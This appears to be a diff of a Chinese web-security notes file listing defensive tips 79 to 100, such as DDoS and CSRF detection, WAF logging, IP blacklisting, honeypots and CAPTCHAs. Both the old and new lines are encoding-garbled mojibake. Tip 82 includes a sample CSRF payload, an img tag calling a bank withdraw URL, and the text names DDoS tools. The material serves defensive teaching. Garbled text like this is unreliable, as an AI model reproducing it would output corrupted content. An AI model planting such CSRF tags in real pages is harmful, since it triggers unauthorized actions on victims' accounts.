-µÚ79¼¼ ¼¯³É²¡¶¾É¨Ãè¹¤¾ß(ÀýÈçClamAV)£¬¼ì²âÉÏ´«ÎÄ¼þÊÇ·ñÎª¶ñÒâÎÄ¼þ
+ç¬¬79æŠ€ é›†æˆç—…æ¯’æ‰«æå·¥å…·(ä¾‹å¦‚ClamAV)ï¼Œæ£€æµ‹ä¸Šä¼ æ–‡ä»¶æ˜¯å¦ä¸ºæ¶æ„æ–‡ä»¶
 
-µÚ80¼¼ HTTP DDoS(CC)¹¥»÷Ê¶±ð
-±È½ÏÓÐÃûµÄ¹¥»÷¹¤¾ßÓÐlow orbit ion cannon LOIC£¬high orbit ion cannon HOIC
-×¢ÒâÓëµÚ8¼¼ÏàÍ¬Ö»¼à¿Ø¶¯Ì¬Ò³Ãæ£¬ÒòÎª¾²Ì¬×ÊÔ´µÄÇëÇóÒ»°ã»á»º´æµ½CDN½Úµã¶øµ½²»ÁËÔ´Õ¾
+ç¬¬80æŠ€ HTTP DDoS(CC)æ”»å‡»è¯†åˆ«
+æ¯”è¾ƒæœ‰åçš„æ”»å‡»å·¥å…·æœ‰low orbit ion cannon LOICï¼Œhigh orbit ion cannon HOIC
+æ³¨æ„ä¸Žç¬¬8æŠ€ç›¸åŒåªç›‘æŽ§åŠ¨æ€é¡µé¢ï¼Œå› ä¸ºé™æ€èµ„æºçš„è¯·æ±‚ä¸€èˆ¬ä¼šç¼“å­˜åˆ°CDNèŠ‚ç‚¹è€Œåˆ°ä¸äº†æºç«™
 
-µÚ81¼¼ HTTP slow DDoS¹¥»÷Ê¶±ð
-±È½ÏÓÐÃûµÄ¹¥»÷¹¤¾ßÓÐslowloris
+ç¬¬81æŠ€ HTTP slow DDoSæ”»å‡»è¯†åˆ«
+æ¯”è¾ƒæœ‰åçš„æ”»å‡»å·¥å…·æœ‰slowloris
 
-µÚ82¼¼ Í¨¹ý¼ì²âºóÐøÇëÇóµÄÏìÓ¦Ê±¼äÊÇ·ñ¹ý¿ìÀ´¼ì²âCSRF¹¥»÷
-ÀýÈçCSRF <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=alice"> ÊÜº¦Õß·ÃÎÊÍ¼Æ¬±êÇ©µÄÍ¬Ê±¾Í·¢ËÍÁËÒ»¸öGETÇëÇó£¬Á½¸öÇëÇóµÄ¼ä¸ôÊ±¼ä·Ç³£¶Ì
-
-
-µÚ83¼¼ ¼ì²âÒì³£µÄHTTPÇëÇó´ÎÐò
-×Ô¶¯»¯¹¥»÷ÍùÍù»á×îÐ¡»¯²Ù×÷²½Öè£¬ÎÒÃÇ¿ÉÒÔ²ÎÕÕµÚ2¼¼£¬µÚ65¼¼£¬Ôö¼ÓtokenÀ´Ô¤·À×Ô¶¯»¯¹¥»÷
-
-2015-12-11:  »ùÓÚÍ¼µÄÒì³£¼ì²â·½Ê½±È½ÏÓÐÐ§£¬±ÈÈç¼ì²â¹ÂÁ¢µãÀ´·¢ÏÖwebshell£¨×¢Òâ²»ÄÜÖ»ÓÐÕâ¸öÌØÕ÷£©£¬±ÈÈç¼à²â·Ç³£¹æÂ·¾¶À´·¢ÏÖÔ½È¨·ÃÎÊ
-
-µÚ84¼¼ Ê¶±ðÍøÕ¾ÌØ¶¨×ÊÔ´·ÃÎÊÁ¿µÄÒì³£
-µ±ÍøÕ¾µÄÄ³¸ö×ÊÔ´µÄ·ÃÎÊÁ¿³öÏÖÒì³£µÄÊ±ºò£¬ÍùÍùÒâÎ¶×Å¹¥»÷·¢ÉúÁË£¬ÀýÈçÐÂÀËÎ¢²©CSRFÈä³æ¹¥»÷ÖÐ×Ô¶¯·¢Î¢²©½Ó¿ÚµÄ×Ô¶¯µ÷ÓÃ
-
-µÚ85¼¼ ¶à¸öHTTPÇëÇóÖ®¼äµÄÁª¶¯·ÖÎö
-ÆôÓÃÐ­Í¬¼ì²âÄ£Ê½£¨¹æÔòÆÀ·ÖÖÆ£©£¬ÀýÈçµ¥¸öIP/»á»°´¥·¢µÄ¹æÔòÇé¿ö
-
-µÚ86¼¼ ¶¯Ì¬¿ªÆôWAFÈÕÖ¾Éó¼Æ
-ÀýÈçµ±ÊÕµ½À´×ÔIPºÚÃûµ¥µÄÇëÇóÊ±£¬¿ªÆôÈÕÖ¾Éó¼Æ¹¦ÄÜ
-
-µÚ87¼¼ email·¢ËÍWAFÐ­Í¬·ÀÓùÏ¸½Ú¸øÕ¾³¤
-¿ÉÒÔµ÷ÓÃÍâ²¿email·¢ËÍ½Å±¾Ò²¿ÉÒÔÊ¹ÓÃAuditConsoleÆ½Ì¨£¨µÚ11¼¼ÖÐÌáµ½£©·¢ËÍ
-
-µÚ88¼¼ ½«WAFÊÂ¼þÐÅÏ¢Í¨¹ýÇëÇóÍ··ÖÏí¸øÆäËû°²È«×é¼þÀ´½øÐÐÁª¶¯·ÖÎö
-µ±²¶»ñÒ»¸ö°²È«¼¶±ð½ÏµÍµÄ¹¥»÷Ê±£¬Ö±½ÓÀ¹½Ø¾Í²»ÊÇ¸öºÃµÄÑ¡ÔñÁË£¬ÕâÊ±ºò¾Í¿ÉÒÔ½«WAFÊÂ¼þÐÅÏ¢·ÖÏí¸øÆäËû°²È«×é¼þ½øÐÐÁª¶¯·ÖÎöÀ´Ö´ÐÐºÏÀíµÄÓ¦¶Ô´ëÊ©£¬¶øÍ¨¹ýHTTPÇëÇóÍ·´«µÝWAFÊÂ¼þÐÅÏ¢¾ÍÊÇ¸ö²»´íµÄ·½°¸£¨ÕâÖÖ·½·¨½Ð×örequest header tagging)¡£
-
-µÚ89¼¼ ½«¹¥»÷ÇëÇóÖØ¶¨Ïòµ½ÓÃ»§ÓÑºÃµÄ×Ô¶¨ÖÆÀ¹½ØÒ³Ãæ
-
-µÚ90¼¼ ¶Ï¿ª¹¥»÷ÕßµÄÍøÂçÁ¬½Ó
-¸Ã´ëÊ©³£ÓÃÓÚ¾Ü¾ø·þÎñ¹¥»÷£¬ÀýÈçCC¹¥»÷
-
-µÚ91¼¼ Ê¹ÓÃIPºÚÃûµ¥×èÈû¹¤¾ß×èÈû¶ñÒâÓÃ»§·ÃÎÊ
-Ò»°ã»á½«User-AgentÓëIPµØÖ·ÁªºÏÆðÀ´À´×èÈû¶ñÒâÓÃ»§·ÃÎÊ
-³£¼ûµÄºÚÃûµ¥×èÈû¹¤¾ßÓÐjwall-Rbld,Jwall AuditConsole, blacklist,samtool(snortsam)
-
-µÚ92¼¼ ¶¯Ì¬ÆôÓÃ»ùÓÚIP-GEOÐÅÏ¢µÄ·Ö¼¶·ÀÓù
-ÀýÈç·¢ÏÖ´óÁ¿¹¥»÷ÕßÀ´×ÔX¹ú£¬¶ÔX¹úÆôÓÃ¸ß¼¶·ÀÓù
-
-µÚ93¼¼ Í¨¹ýÑÓ³Ù¶ÔÇëÇóµÄÏìÓ¦Ê±¼äÀ´¼õ»º×Ô¶¯»¯¹¥»÷£¬¸ø·ÀÓùÕßÕùÈ¡Ê±¼äÀ´Ó¦¶Ô¹¥»÷
-
-µÚ94¼¼ Î±Ôì¹¥»÷³É¹¦µÄ·µ»ØÒ³ÃæÀ´ÃÔ»ó¹¥»÷Õß£¬¸ø·ÀÓùÕßÕùÈ¡Ê±¼äÀ´Ó¦¶Ô¹¥»÷
-¼¯³ÉhoneypotµÄ·ÀÓùË¼Ïë
-
-µÚ95¼¼ ½«¹¥»÷ÇëÇó´úÀíµ½honeypot
-
-µÚ96¼¼ µ±¼ì²âµ½»á»°Òì³£Ê±£¬Ç¿ÖÆ¹¥»÷ÕßµÇ³ö
-ÀýÈçµ±»á»°ÆÚ¼äuseragent·¢Éú±ä»¯Ê±£¬Ç¿ÖÆ¹¥»÷ÕßµÇ³ö
-
-µÚ97¼¼ µ±¹¥»÷ÊÂ¼þ·¢ÉúÊ±£¬Ëø¶¨¹¥»÷ÕßÕËºÅÒ»¶ÎÊ±¼ä 
-
-µÚ98¼¼ Ê¹ÓÃJS×¢Èëcookie×èÈûÁ÷Á¿ÐÔ¹¥»÷(ÀýÈçCC¹¥»÷)
-
-µÚ99¼¼ Ê¹ÓÃÑéÖ¤Âë×èÈû×Ô¶¯»¯£¨»úÆ÷£©¹¥»÷
-ÀýÈç×Ô¶¯×¢²á£¬×Ô¶¯·¢ËÍÀ¬»øÌùµÈ»úÆ÷ÈËÐÐÎª
-ÄÔ¶´£º×¢ÒâÑéÖ¤Âë·þÎñÆ÷Òª×ã¹»½¡×³£¬ÒÔÃâÕÐÊÜ¾Ü¾ø·þÎñ¹¥»÷Ê±µ¼ÖÂÕâÒ»´ëÊ©Ê§Ð§
-
-µÚ100¼¼ ¼¯³ÉBeFF(browser exploit framework)À´·ÖÎö¶ñÒâÓÃ»§ÇëÇó
+ç¬¬82æŠ€ é€šè¿‡æ£€æµ‹åŽç»­è¯·æ±‚çš„å“åº”æ—¶é—´æ˜¯å¦è¿‡å¿«æ¥æ£€æµ‹CSRFæ”»å‡»
+ä¾‹å¦‚CSRF <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=alice"> å—å®³è€…è®¿é—®å›¾ç‰‡æ ‡ç­¾çš„åŒæ—¶å°±å‘é€äº†ä¸€ä¸ªGETè¯·æ±‚ï¼Œä¸¤ä¸ªè¯·æ±‚çš„é—´éš”æ—¶é—´éžå¸¸çŸ­
 
 
-ÖÕÓÚÐ´ÍêÁË£¬ÎÒÃÇ»á·¢ÏÖÕâ100¸ö·ÀÓù¼¼ÇÉÖÐ³öÏÖÁËÒÔÏÂ¹¤¾ß(¹æ·¶»ò·½·¨£©
+ç¬¬83æŠ€ æ£€æµ‹å¼‚å¸¸çš„HTTPè¯·æ±‚æ¬¡åº
+è‡ªåŠ¨åŒ–æ”»å‡»å¾€å¾€ä¼šæœ€å°åŒ–æ“ä½œæ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥å‚ç…§ç¬¬2æŠ€ï¼Œç¬¬65æŠ€ï¼Œå¢žåŠ tokenæ¥é¢„é˜²è‡ªåŠ¨åŒ–æ”»å‡»
 
-WAF(webÓ¦ÓÃ·À»ðÇ½)£¬Snort(ÈëÇÖ¼ì²âÏµÍ³£©£¬OSVDB(¿ªÔ´Â©¶´¿â)£¬honeypot(ÃÛ¹Þ)£¬Arachni(Â©¶´É¨ÃèÆ÷£©£¬BeFF(Â©¶´ÍÚ¾ò¿ò¼Ü)£¬ClamAV(É±¶¾Èí¼þ)£¬tripwires(ÎÄ¼þÍêÕûÐÔÐ£Ñé¹¤¾ß£¬ÔÚwebÁìÓò¿ÉÒÔÓÃÀ´Ô¤·ÀHTTPÇëÇóÊý¾Ý´Û¸Ä£¬µöÓãÒ³ÃæÎ±ÔìºÍ×Ô¶¯»¯Ìá½»ÇëÇó)£¬RBL(ÊµÊ±IPºÚ¿â£¬IPÐÅÓþ¿â)£¬URIBL Google Safe Browsing API(¶ñÒâÍøÖ·¿â£©£¬javascript sandbox(É³Ïä)£¬SIEM(°²È«ÐÅÏ¢ÓëÊÂ¼þ¹ÜÀíÆ½Ì¨), SQL´Ê·¨·ÖÎöÆ÷ £¬HTTP RFC¹æ·¶£¬±àÂëÓ³Éä±í£¬ÆÓËØ±´Ò¶Ë¹·ÖÀàËã·¨
+2015-12-11:  åŸºäºŽå›¾çš„å¼‚å¸¸æ£€æµ‹æ–¹å¼æ¯”è¾ƒæœ‰æ•ˆï¼Œæ¯”å¦‚æ£€æµ‹å­¤ç«‹ç‚¹æ¥å‘çŽ°webshellï¼ˆæ³¨æ„ä¸èƒ½åªæœ‰è¿™ä¸ªç‰¹å¾ï¼‰ï¼Œæ¯”å¦‚ç›‘æµ‹éžå¸¸è§„è·¯å¾„æ¥å‘çŽ°è¶Šæƒè®¿é—®
 
-ÓÚÊÇ£¬¿ÉÒÔºÜÈÝÒ×·¢ÏÖweb°²È«·ÀÓùÊÇ¸öÕûÌå£¬ÐèÒª½«¸÷¸ö×é¼þ£¨¹Ø¿¨£©ÓÐÐ§µØÁª¶¯ÆðÀ´ÐÎ³É±ÚÀÝ£¬°²È«·ÀÓù·½·¨Ò²ÊÇÃ»ÓÐÑÏ¸ñµÄÁìÓòÇø·ÖµÄ£¬¿Í»§¶ËµÄ°²È«¼¼ÇÉ¿ÉÒÔÓÃÓÚweb£¬·´Ö®ÒàÈ»£¬Í¬Ê±ÔÚ½â¾öÄ³¸ö°²È«ÎÊÌâÊ±£¬Èç¹ûÕÒ²»µ½ÍêÉÆµÄµ¥¶À½â¾ö·½°¸£¬²»·ÁÍ¬Ê±Ê¹ÓÃ²»Í¬µÄÓÐÈ±ÏÝµÄ·ÀÓù·½°¸£¬Èý¸ö³ôÆ¤½³¶¥¸öÖî¸ðÁÁ¡£
+ç¬¬84æŠ€ è¯†åˆ«ç½‘ç«™ç‰¹å®šèµ„æºè®¿é—®é‡çš„å¼‚å¸¸
+å½“ç½‘ç«™çš„æŸä¸ªèµ„æºçš„è®¿é—®é‡å‡ºçŽ°å¼‚å¸¸çš„æ—¶å€™ï¼Œå¾€å¾€æ„å‘³ç€æ”»å‡»å‘ç”Ÿäº†ï¼Œä¾‹å¦‚æ–°æµªå¾®åšCSRFè •è™«æ”»å‡»ä¸­è‡ªåŠ¨å‘å¾®åšæŽ¥å£çš„è‡ªåŠ¨è°ƒç”¨
+
+ç¬¬85æŠ€ å¤šä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„è”åŠ¨åˆ†æž
+å¯ç”¨ååŒæ£€æµ‹æ¨¡å¼ï¼ˆè§„åˆ™è¯„åˆ†åˆ¶ï¼‰ï¼Œä¾‹å¦‚å•ä¸ªIP/ä¼šè¯è§¦å‘çš„è§„åˆ™æƒ…å†µ
+
+ç¬¬86æŠ€ åŠ¨æ€å¼€å¯WAFæ—¥å¿—å®¡è®¡
+ä¾‹å¦‚å½“æ”¶åˆ°æ¥è‡ªIPé»‘åå•çš„è¯·æ±‚æ—¶ï¼Œå¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½
+
+ç¬¬87æŠ€ emailå‘é€WAFååŒé˜²å¾¡ç»†èŠ‚ç»™ç«™é•¿
+å¯ä»¥è°ƒç”¨å¤–éƒ¨emailå‘é€è„šæœ¬ä¹Ÿå¯ä»¥ä½¿ç”¨AuditConsoleå¹³å°ï¼ˆç¬¬11æŠ€ä¸­æåˆ°ï¼‰å‘é€
+
+ç¬¬88æŠ€ å°†WAFäº‹ä»¶ä¿¡æ¯é€šè¿‡è¯·æ±‚å¤´åˆ†äº«ç»™å…¶ä»–å®‰å…¨ç»„ä»¶æ¥è¿›è¡Œè”åŠ¨åˆ†æž
+å½“æ•èŽ·ä¸€ä¸ªå®‰å…¨çº§åˆ«è¾ƒä½Žçš„æ”»å‡»æ—¶ï¼Œç›´æŽ¥æ‹¦æˆªå°±ä¸æ˜¯ä¸ªå¥½çš„é€‰æ‹©äº†ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å°†WAFäº‹ä»¶ä¿¡æ¯åˆ†äº«ç»™å…¶ä»–å®‰å…¨ç»„ä»¶è¿›è¡Œè”åŠ¨åˆ†æžæ¥æ‰§è¡Œåˆç†çš„åº”å¯¹æŽªæ–½ï¼Œè€Œé€šè¿‡HTTPè¯·æ±‚å¤´ä¼ é€’WAFäº‹ä»¶ä¿¡æ¯å°±æ˜¯ä¸ªä¸é”™çš„æ–¹æ¡ˆï¼ˆè¿™ç§æ–¹æ³•å«åšrequest header tagging)ã€‚
+
+ç¬¬89æŠ€ å°†æ”»å‡»è¯·æ±‚é‡å®šå‘åˆ°ç”¨æˆ·å‹å¥½çš„è‡ªå®šåˆ¶æ‹¦æˆªé¡µé¢
+
+ç¬¬90æŠ€ æ–­å¼€æ”»å‡»è€…çš„ç½‘ç»œè¿žæŽ¥
+è¯¥æŽªæ–½å¸¸ç”¨äºŽæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œä¾‹å¦‚CCæ”»å‡»
+
+ç¬¬91æŠ€ ä½¿ç”¨IPé»‘åå•é˜»å¡žå·¥å…·é˜»å¡žæ¶æ„ç”¨æˆ·è®¿é—®
+ä¸€èˆ¬ä¼šå°†User-Agentä¸ŽIPåœ°å€è”åˆèµ·æ¥æ¥é˜»å¡žæ¶æ„ç”¨æˆ·è®¿é—®
+å¸¸è§çš„é»‘åå•é˜»å¡žå·¥å…·æœ‰jwall-Rbld,Jwall AuditConsole, blacklist,samtool(snortsam)
+
+ç¬¬92æŠ€ åŠ¨æ€å¯ç”¨åŸºäºŽIP-GEOä¿¡æ¯çš„åˆ†çº§é˜²å¾¡
+ä¾‹å¦‚å‘çŽ°å¤§é‡æ”»å‡»è€…æ¥è‡ªXå›½ï¼Œå¯¹Xå›½å¯ç”¨é«˜çº§é˜²å¾¡
+
+ç¬¬93æŠ€ é€šè¿‡å»¶è¿Ÿå¯¹è¯·æ±‚çš„å“åº”æ—¶é—´æ¥å‡ç¼“è‡ªåŠ¨åŒ–æ”»å‡»ï¼Œç»™é˜²å¾¡è€…äº‰å–æ—¶é—´æ¥åº”å¯¹æ”»å‡»
+
+ç¬¬94æŠ€ ä¼ªé€ æ”»å‡»æˆåŠŸçš„è¿”å›žé¡µé¢æ¥è¿·æƒ‘æ”»å‡»è€…ï¼Œç»™é˜²å¾¡è€…äº‰å–æ—¶é—´æ¥åº”å¯¹æ”»å‡»
+é›†æˆhoneypotçš„é˜²å¾¡æ€æƒ³
+
+ç¬¬95æŠ€ å°†æ”»å‡»è¯·æ±‚ä»£ç†åˆ°honeypot
+
+ç¬¬96æŠ€ å½“æ£€æµ‹åˆ°ä¼šè¯å¼‚å¸¸æ—¶ï¼Œå¼ºåˆ¶æ”»å‡»è€…ç™»å‡º
+ä¾‹å¦‚å½“ä¼šè¯æœŸé—´useragentå‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¼ºåˆ¶æ”»å‡»è€…ç™»å‡º
+
+ç¬¬97æŠ€ å½“æ”»å‡»äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œé”å®šæ”»å‡»è€…è´¦å·ä¸€æ®µæ—¶é—´ 
+
+ç¬¬98æŠ€ ä½¿ç”¨JSæ³¨å…¥cookieé˜»å¡žæµé‡æ€§æ”»å‡»(ä¾‹å¦‚CCæ”»å‡»)
+
+ç¬¬99æŠ€ ä½¿ç”¨éªŒè¯ç é˜»å¡žè‡ªåŠ¨åŒ–ï¼ˆæœºå™¨ï¼‰æ”»å‡»
+ä¾‹å¦‚è‡ªåŠ¨æ³¨å†Œï¼Œè‡ªåŠ¨å‘é€åžƒåœ¾è´´ç­‰æœºå™¨äººè¡Œä¸º
+è„‘æ´žï¼šæ³¨æ„éªŒè¯ç æœåŠ¡å™¨è¦è¶³å¤Ÿå¥å£®ï¼Œä»¥å…æ‹›å—æ‹’ç»æœåŠ¡æ”»å‡»æ—¶å¯¼è‡´è¿™ä¸€æŽªæ–½å¤±æ•ˆ
+
+ç¬¬100æŠ€ é›†æˆBeFF(browser exploit framework)æ¥åˆ†æžæ¶æ„ç”¨æˆ·è¯·æ±‚
+
+
+ç»ˆäºŽå†™å®Œäº†ï¼Œæˆ‘ä»¬ä¼šå‘çŽ°è¿™100ä¸ªé˜²å¾¡æŠ€å·§ä¸­å‡ºçŽ°äº†ä»¥ä¸‹å·¥å…·(è§„èŒƒæˆ–æ–¹æ³•ï¼‰
+
+WAF(webåº”ç”¨é˜²ç«å¢™)ï¼ŒSnort(å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰ï¼ŒOSVDB(å¼€æºæ¼æ´žåº“)ï¼Œhoneypot(èœœç½)ï¼ŒArachni(æ¼æ´žæ‰«æå™¨ï¼‰ï¼ŒBeFF(æ¼æ´žæŒ–æŽ˜æ¡†æž¶)ï¼ŒClamAV(æ€æ¯’è½¯ä»¶)ï¼Œtripwires(æ–‡ä»¶å®Œæ•´æ€§æ ¡éªŒå·¥å…·ï¼Œåœ¨webé¢†åŸŸå¯ä»¥ç”¨æ¥é¢„é˜²HTTPè¯·æ±‚æ•°æ®ç¯¡æ”¹ï¼Œé’“é±¼é¡µé¢ä¼ªé€ å’Œè‡ªåŠ¨åŒ–æäº¤è¯·æ±‚)ï¼ŒRBL(å®žæ—¶IPé»‘åº“ï¼ŒIPä¿¡èª‰åº“)ï¼ŒURIBL Google Safe Browsing API(æ¶æ„ç½‘å€åº“ï¼‰ï¼Œjavascript sandbox(æ²™ç®±)ï¼ŒSIEM(å®‰å…¨ä¿¡æ¯ä¸Žäº‹ä»¶ç®¡ç†å¹³å°), SQLè¯æ³•åˆ†æžå™¨ ï¼ŒHTTP RFCè§„èŒƒï¼Œç¼–ç æ˜ å°„è¡¨ï¼Œæœ´ç´ è´å¶æ–¯åˆ†ç±»ç®—æ³•
+
+äºŽæ˜¯ï¼Œå¯ä»¥å¾ˆå®¹æ˜“å‘çŽ°webå®‰å…¨é˜²å¾¡æ˜¯ä¸ªæ•´ä½“ï¼Œéœ€è¦å°†å„ä¸ªç»„ä»¶ï¼ˆå…³å¡ï¼‰æœ‰æ•ˆåœ°è”åŠ¨èµ·æ¥å½¢æˆå£åž’ï¼Œå®‰å…¨é˜²å¾¡æ–¹æ³•ä¹Ÿæ˜¯æ²¡æœ‰ä¸¥æ ¼çš„é¢†åŸŸåŒºåˆ†çš„ï¼Œå®¢æˆ·ç«¯çš„å®‰å…¨æŠ€å·§å¯ä»¥ç”¨äºŽwebï¼Œåä¹‹äº¦ç„¶ï¼ŒåŒæ—¶åœ¨è§£å†³æŸä¸ªå®‰å…¨é—®é¢˜æ—¶ï¼Œå¦‚æžœæ‰¾ä¸åˆ°å®Œå–„çš„å•ç‹¬è§£å†³æ–¹æ¡ˆï¼Œä¸å¦¨åŒæ—¶ä½¿ç”¨ä¸åŒçš„æœ‰ç¼ºé™·çš„é˜²å¾¡æ–¹æ¡ˆï¼Œä¸‰ä¸ªè‡­çš®åŒ é¡¶ä¸ªè¯¸è‘›äº®ã€‚
 
 2015-12-11:  
-ÏÖÔÚ³öÀ´ÁË²»ÉÙÐÂ¸ÅÄîµÄ°²È«²úÆ·£¬×ÐÏ¸ÑÐ¾¿ÏÂÀ´»ù±¾ÊôÓÚÒÔÏÂÁ½ÖÖ
-£¨1£©Í¨ÓÃÐÍ°²È«²úÆ·£º°²È«×é¼þ´óÀñ°ü£¬±ÈÈçËµ¼¯³ÉwebÂ©¶´¼ì²â¡¢¶ñÒâÈí¼þ¼ì²â¡¢¶ñÒâÍøÖ·¼ì²â¡¢DNS£¯DDoS¼ì²â¡¢Çé±¨ÐÅÏ¢£¨°üÀ¨Â©¶´£¯¹¥»÷ÊÂ¼þfeed£¬ÐÅÏ¢Ð¹Â©¼¯³É£©£¬½«ÍøÂç²ãÃæµÄÁ÷Á¿ÐÅÏ¢£¯ÏµÍ³²ãÃæµÄ½ø³ÌÈÕÖ¾ÐÅÏ¢ ¶¨Ïòµ½°²È«×é¼þÖÐ½øÐÐ¼ì²â£¬½«½á¹û¾ÛºÏºóÕ¹Ê¾ÔÚ¿ØÖÆÃæ°åÉÏ£¨Ä¿Ç°»¹Ã»ÓÐ¿´µ½Ê²Ã´²úÆ·×öµ½Ç¿¾ÛºÏ£©
-ÕâÖÖ²úÆ·µÄÌØÐÔÊÇ¶ÔÎó±¨ÈÝÈÌÐÔ²î£¬¾²Ì¬¼ì²â¹æÔòÎªÖ÷
+çŽ°åœ¨å‡ºæ¥äº†ä¸å°‘æ–°æ¦‚å¿µçš„å®‰å…¨äº§å“ï¼Œä»”ç»†ç ”ç©¶ä¸‹æ¥åŸºæœ¬å±žäºŽä»¥ä¸‹ä¸¤ç§
+ï¼ˆ1ï¼‰é€šç”¨åž‹å®‰å…¨äº§å“ï¼šå®‰å…¨ç»„ä»¶å¤§ç¤¼åŒ…ï¼Œæ¯”å¦‚è¯´é›†æˆwebæ¼æ´žæ£€æµ‹ã€æ¶æ„è½¯ä»¶æ£€æµ‹ã€æ¶æ„ç½‘å€æ£€æµ‹ã€DNSï¼DDoSæ£€æµ‹ã€æƒ…æŠ¥ä¿¡æ¯ï¼ˆåŒ…æ‹¬æ¼æ´žï¼æ”»å‡»äº‹ä»¶feedï¼Œä¿¡æ¯æ³„æ¼é›†æˆï¼‰ï¼Œå°†ç½‘ç»œå±‚é¢çš„æµé‡ä¿¡æ¯ï¼ç³»ç»Ÿå±‚é¢çš„è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ å®šå‘åˆ°å®‰å…¨ç»„ä»¶ä¸­è¿›è¡Œæ£€æµ‹ï¼Œå°†ç»“æžœèšåˆåŽå±•ç¤ºåœ¨æŽ§åˆ¶é¢æ¿ä¸Šï¼ˆç›®å‰è¿˜æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆäº§å“åšåˆ°å¼ºèšåˆï¼‰
+è¿™ç§äº§å“çš„ç‰¹æ€§æ˜¯å¯¹è¯¯æŠ¥å®¹å¿æ€§å·®ï¼Œé™æ€æ£€æµ‹è§„åˆ™ä¸ºä¸»
 
-£¨2£©´¹Ö±ÐÍ°²È«²úÆ·£ºÕâÖÖ¿Í»§¶¼ÓÐ×Å¸ß¶Ë»ò¸üÖ±½ÓµÄ°²È«ÐèÇó£¬ÀýÈçÆÛÕ©Ê¶±ðÎªÖ÷µÄÒµÎñ°²È«¡¢½ðÈÚ²úÆ·°²È«£¨±ÈÈçËµÖ§¸¶ÖÕ¶ËÂ©¶´£¬Ö§¸¶Ä¾Âí£©£¬½ðÈÚÆóÒµ°²È«£¨Õë¶Ô½ðÈÚÐÐÒµµÄ×¨ÒµºÚ¿Í¹¥»÷£©
-ÕâÖÖ²úÆ·µÄÌØÐÔÊÇ¶ÔÂ©±¨ÈÝÈÌÐÔ²î£¬¸öÈË¸Ð¾õÊÇÑÐ·¢´ú¼Û±È½Ï´óµÄÊý¾Ý°²È«·ÖÎö¼¼Êõ¸üÄÜ·¢»Ó×÷ÓÃµÄµØ·½
+ï¼ˆ2ï¼‰åž‚ç›´åž‹å®‰å…¨äº§å“ï¼šè¿™ç§å®¢æˆ·éƒ½æœ‰ç€é«˜ç«¯æˆ–æ›´ç›´æŽ¥çš„å®‰å…¨éœ€æ±‚ï¼Œä¾‹å¦‚æ¬ºè¯ˆè¯†åˆ«ä¸ºä¸»çš„ä¸šåŠ¡å®‰å…¨ã€é‡‘èžäº§å“å®‰å…¨ï¼ˆæ¯”å¦‚è¯´æ”¯ä»˜ç»ˆç«¯æ¼æ´žï¼Œæ”¯ä»˜æœ¨é©¬ï¼‰ï¼Œé‡‘èžä¼ä¸šå®‰å…¨ï¼ˆé’ˆå¯¹é‡‘èžè¡Œä¸šçš„ä¸“ä¸šé»‘å®¢æ”»å‡»ï¼‰
+è¿™ç§äº§å“çš„ç‰¹æ€§æ˜¯å¯¹æ¼æŠ¥å®¹å¿æ€§å·®ï¼Œä¸ªäººæ„Ÿè§‰æ˜¯ç ”å‘ä»£ä»·æ¯”è¾ƒå¤§çš„æ•°æ®å®‰å…¨åˆ†æžæŠ€æœ¯æ›´èƒ½å‘æŒ¥ä½œç”¨çš„åœ°æ–¹
 
 
 
